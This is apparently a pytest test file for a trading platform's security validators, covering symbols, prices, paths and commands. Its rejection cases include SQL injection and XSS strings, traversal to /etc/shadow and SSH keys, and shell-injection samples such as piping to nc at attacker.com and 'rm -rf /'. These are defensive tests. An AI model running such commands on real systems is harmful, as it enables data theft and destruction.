# Copyright (c) 2023-2026 Yaroslav Vasylenko (neuron7xLab)
# SPDX-License-Identifier: MIT
"""Tests for security validation framework."""

from decimal import Decimal

import pytest

from core.security.validation import (
    CommandValidator,
    NumericRangeValidator,
    PathValidator,
    TradingSymbolValidator,
    ValidationError,
)


class TestTradingSymbolValidator:
    """Tests for trading symbol validation."""

    def test_valid_symbols(self):
        """Test validation of valid trading symbols."""
        valid_symbols = ["AAPL", "BTC-USD", "SPY.US", "ES_F", "MSFT"]

        for symbol in valid_symbols:
            validator = TradingSymbolValidator(symbol=symbol)
            assert validator.symbol == symbol.upper()

    def test_symbol_normalization(self):
        """Test symbol is normalized to uppercase."""
        validator = TradingSymbolValidator(symbol="aapl")
        assert validator.symbol == "AAPL"

    def test_invalid_characters(self):
        """Test rejection of symbols with invalid characters."""
        invalid_symbols = [
            "AAP L",  # Space
            "AAPL@",  # Special char
            "AAP/L",  # Forward slash
            "AAP\\L",  # Backslash
        ]

        for symbol in invalid_symbols:
            with pytest.raises(ValueError, match="must contain only"):
                TradingSymbolValidator(symbol=symbol)

    def test_sql_injection_patterns(self):
        """Test rejection of SQL injection patterns."""
        malicious_symbols = [
            "AAPL--",  # SQL comment
            "AAPL;DROP",  # SQL delimiter
            "AAPL/*comment*/",  # SQL comment
        ]

        for symbol in malicious_symbols:
            with pytest.raises(ValueError):
                TradingSymbolValidator(symbol=symbol)

    def test_xss_patterns(self):
        """Test rejection of XSS patterns."""
        malicious_symbols = [
            "<script>alert(1)</script>",
            "javascript:alert(1)",
        ]

        for symbol in malicious_symbols:
            with pytest.raises(ValueError):
                TradingSymbolValidator(symbol=symbol)

    def test_path_traversal_patterns(self):
        """Test rejection of path traversal patterns."""
        with pytest.raises(ValueError):
            TradingSymbolValidator(symbol="../etc/passwd")


class TestNumericRangeValidator:
    """Tests for numeric range validation."""

    def test_valid_price(self):
        """Test validation of valid prices."""
        validator = NumericRangeValidator()

        prices = [0.01, 100.50, 1000.99, 99999.99]
        for price in prices:
            result = validator.validate_price(price)
            assert isinstance(result, Decimal)
            assert result > 0

    def test_price_too_low(self):
        """Test rejection of prices below minimum."""
        validator = NumericRangeValidator()

        with pytest.raises(ValidationError, match="at least"):
            validator.validate_price(0.0)

    def test_price_at_minimum_is_accepted(self):
        """Boundary price equal to minimum should be accepted."""
        validator = NumericRangeValidator()

        assert validator.validate_price(0.0001) == Decimal("0.0001")

    def test_price_too_high(self):
        """Test rejection of prices above maximum."""
        validator = NumericRangeValidator()

        with pytest.raises(ValidationError, match="exceeds maximum"):
            validator.validate_price(2_000_000_000.0)

    def test_price_excessive_precision(self):
        """Test rejection of prices with excessive decimal places."""
        validator = NumericRangeValidator()

        # More than 8 decimal places
        with pytest.raises(ValidationError, match="excessive decimal places"):
            validator.validate_price(1.123456789)

    def test_valid_quantity(self):
        """Test validation of valid quantities."""
        validator = NumericRangeValidator()

        quantities = [0.01, 1.0, 100.5, 10000.0]
        for qty in quantities:
            result = validator.validate_quantity(qty)
            assert isinstance(result, Decimal)
            assert result > 0

    def test_quantity_boundaries(self):
        """Test quantity boundary conditions."""
        validator = NumericRangeValidator()

        # Just above minimum
        result = validator.validate_quantity(0.000002)
        assert result > 0

        # Too low
        with pytest.raises(ValidationError):
            validator.validate_quantity(0.0)

        # Too high
        with pytest.raises(ValidationError):
            validator.validate_quantity(200_000_000.0)

    def test_percentage_validation(self):
        """Test percentage validation."""
        validator = NumericRangeValidator()

        # Valid percentages
        valid_pcts = [-50.0, -10.5, 0.0, 25.5, 99.9]
        for pct in valid_pcts:
            result = validator.validate_percentage(pct)
            assert isinstance(result, float)
            assert -100.0 <= result <= 100.0

    def test_percentage_out_of_range(self):
        """Test rejection of percentages out of range."""
        validator = NumericRangeValidator()

        with pytest.raises(ValidationError, match="must be between"):
            validator.validate_percentage(-101.0)

        with pytest.raises(ValidationError, match="must be between"):
            validator.validate_percentage(101.0)

    def test_percentage_special_values(self):
        """Test rejection of special float values."""
        validator = NumericRangeValidator()

        # NaN
        with pytest.raises(ValidationError, match="must be a finite number"):
            validator.validate_percentage(float("nan"))

        # Infinity
        with pytest.raises(ValidationError, match="must be a finite number"):
            validator.validate_percentage(float("inf"))


class TestPathValidator:
    """Tests for path validation."""

    def test_safe_path(self):
        """Test validation of safe paths."""
        validator = PathValidator()

        safe_paths = [
            "data/market_data.csv",
            "models/strategy_v1.pkl",
            "config.yaml",
        ]

        for path in safe_paths:
            result = validator.validate_safe_path(path)
            assert result == path

    def test_path_traversal_detection(self):
        """Test detection of path traversal patterns."""
        validator = PathValidator()

        dangerous_paths = [
            "../etc/passwd",
            "data/../../etc/shadow",
            "~/.ssh/id_rsa",
            "/etc/../etc/passwd",
        ]

        for path in dangerous_paths:
            with pytest.raises(ValidationError, match="potentially dangerous pattern"):
                validator.validate_safe_path(path)

    def test_environment_variable_detection(self):
        """Test detection of environment variable patterns."""
        validator = PathValidator()

        dangerous_paths = [
            "$HOME/.ssh/id_rsa",
            "%USERPROFILE%/secret.txt",
        ]

        for path in dangerous_paths:
            with pytest.raises(ValidationError, match="potentially dangerous pattern"):
                validator.validate_safe_path(path)

    def test_base_directory_constraint(self, tmp_path):
        """Test enforcement of base directory constraint."""
        validator = PathValidator()

        # Create test structure
        allowed_dir = tmp_path / "allowed"
        allowed_dir.mkdir()
        (allowed_dir / "test.txt").touch()

        # Path within allowed directory - should pass
        safe_path = str(allowed_dir / "test.txt")
        result = validator.validate_safe_path(safe_path, allowed_base=str(allowed_dir))
        assert result == safe_path

    def test_double_slash_detection(self):
        """Test detection of double slash patterns."""
        validator = PathValidator()

        with pytest.raises(ValidationError, match="potentially dangerous pattern"):
            validator.validate_safe_path("data//file.txt")


class TestCommandValidator:
    """Tests for command validation."""

    def test_valid_commands(self):
        """Test validation of whitelisted commands."""
        validator = CommandValidator()

        valid_commands = [
            ["git", "status"],
            ["python", "-m", "pytest"],
            ["black", "--check", "."],
        ]

        for cmd in valid_commands:
            result = validator.validate_command(cmd)
            assert result == cmd

    def test_command_string_parsing(self):
        """Test parsing of command strings."""
        validator = CommandValidator()

        cmd_str = "pytest -v tests/"
        result = validator.validate_command(cmd_str)
        assert result == ["pytest", "-v", "tests/"]

    def test_non_whitelisted_command(self):
        """Test rejection of non-whitelisted commands."""
        validator = CommandValidator()

        with pytest.raises(ValidationError, match="not in whitelist"):
            validator.validate_command(["rm", "-rf", "/"])

    def test_shell_injection_patterns(self):
        """Test detection of shell injection patterns."""
        validator = CommandValidator()

        dangerous_commands = [
            ["git", "status;", "rm", "-rf", "/"],
            ["python", "|", "nc", "attacker.com"],
            ["pytest", "&&", "malicious_script.sh"],
            ["python", "$(/bin/sh)"],
            ["git", "`whoami`"],
        ]

        for cmd in dangerous_commands:
            with pytest.raises(ValidationError, match="potentially dangerous pattern"):
                validator.validate_command(cmd)

    def test_redirect_detection(self):
        """Test detection of redirect operators."""
        validator = CommandValidator()

        with pytest.raises(ValidationError, match="potentially dangerous pattern"):
            validator.validate_command(["python", "script.py", ">", "output.txt"])

    def test_empty_command(self):
        """Test rejection of empty commands."""
        validator = CommandValidator()

        with pytest.raises(ValidationError, match="cannot be empty"):
            validator.validate_command([])

    def test_full_path_command(self):
        """Test validation of commands with full paths."""
        validator = CommandValidator()

        # Command with full path should still validate against whitelist
        result = validator.validate_command(["/usr/bin/python", "script.py"])
        assert result == ["/usr/bin/python", "script.py"]
